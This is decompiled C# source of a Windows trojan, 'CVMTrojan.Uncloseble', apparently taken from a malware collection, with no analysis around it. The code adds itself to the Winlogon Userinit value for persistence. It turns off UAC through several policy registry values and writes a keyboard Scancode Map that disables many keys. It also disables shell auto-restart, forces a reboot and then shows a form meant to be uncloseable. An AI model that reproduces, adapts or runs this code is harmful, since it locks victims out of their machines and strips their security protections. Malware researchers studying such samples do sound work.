// Decompiled with JetBrains decompiler
// Type: CVMTrojan.Uncloseble.Program
// Assembly: CVMTrojan.Uncloseble, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DCB2C54A-CD9F-4160-AF1D-2C926403FA8D
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Trojan\CVMTrojan.Uncloseable\CVMTrojan.Unclosable-net4.0.exe

using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

#nullable disable
namespace CVMTrojan.Uncloseble;

internal static class Program
{
  [DllImport("user32.dll")]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

  public static void WinlogonStartup(string StartupTo, string Path)
  {
    RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
    string str = registryKey.GetValue(StartupTo).ToString();
    if (Path == null || str.Contains(Path))
      return;
    registryKey.SetValue(StartupTo, (object) $"{str}, {Path}");
    registryKey.Close();
  }

  [STAThread]
  private static void Main()
  {
    RegistryKey subKey1 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\WinDef");
    if (subKey1.GetValue("Run") == null)
    {
      Program.WinlogonStartup("Userinit", Application.ExecutablePath);
      try
      {
        RegistryKey subKey2 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        subKey2.SetValue("EnableLUA", (object) 0);
        subKey2.SetValue("EnableInstallerDetection", (object) 0);
        subKey2.SetValue("PromptOnSecureDesktop", (object) 0);
        subKey2.SetValue("ConsentPromptBehaviorAdmin", (object) 0);
        subKey2.SetValue("EnableSecureUIAPaths", (object) 0);
        subKey2.SetValue("EnableVirtualization", (object) 0);
        subKey2.SetValue("FilterAdministratorToken", (object) 0);
        subKey2.SetValue("EnableUIADesktopToggle", (object) 0);
      }
      catch
      {
      }
      subKey1.SetValue("Run", (object) 1);
      subKey1.Close();
      RegistryKey subKey3 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout");
      subKey3.SetValue("Scancode Map", (object) new byte[132]
      {
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 30,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 59,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 60,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 61,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 62,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 63 /*0x3F*/,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 64 /*0x40*/,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 51,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 52,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 53,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 11,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 2,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 3,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 4,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 5,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 6,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 8,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 9,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 10,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 35,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 82,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 14,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 58,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 28,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 1,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 29,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 42,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 29,
        (byte) 224 /*0xE0*/,
        (byte) 0,
        (byte) 0,
        (byte) 54,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 15,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0
      }, RegistryValueKind.Binary);
      subKey3.Close();
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
        registryKey.SetValue("AutoRestartShell", (object) 0, RegistryValueKind.DWord);
        registryKey.Close();
      }
      catch
      {
      }
      new Reboot().halt(true, true);
    }
    else
    {
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Application.Run((Form) new Form1());
    }
  }
}
